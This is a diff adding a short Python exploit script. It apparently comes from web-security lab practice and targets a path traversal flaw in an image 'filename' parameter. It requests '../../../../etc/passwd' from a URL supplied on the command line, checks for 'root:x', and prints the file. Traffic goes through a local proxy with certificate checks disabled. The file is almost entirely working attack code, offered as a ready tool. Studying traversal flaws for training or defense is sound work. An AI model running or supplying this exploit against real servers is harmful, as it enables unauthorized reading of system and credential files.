@@ -1,0 +1,29 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
+
+def directory_traversal_exploit(exploit_url):
+    image_url = exploit_url +'/image?filename=../../../../etc/passwd'
+    req = requests.get(image_url, verify=False, proxies=proxies)
+    if 'root:x' in req.text:
+        print('The Exploit is Successful!')
+        print('Here is the content of /etc/passwd file:')
+        print(req.text)
+    else:
+        print('Exploit has failed, Try Again.')
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: %a <url>" % sys.argv[0])
+        sys.exit(-1)
+    
+    exploit_url = sys.argv[1]
+    print("Exploiting the directory traversal vulnerability on" ,exploit_url)
+    directory_traversal_exploit(exploit_url)
+
+if __name__ == "__main__":
+    main()
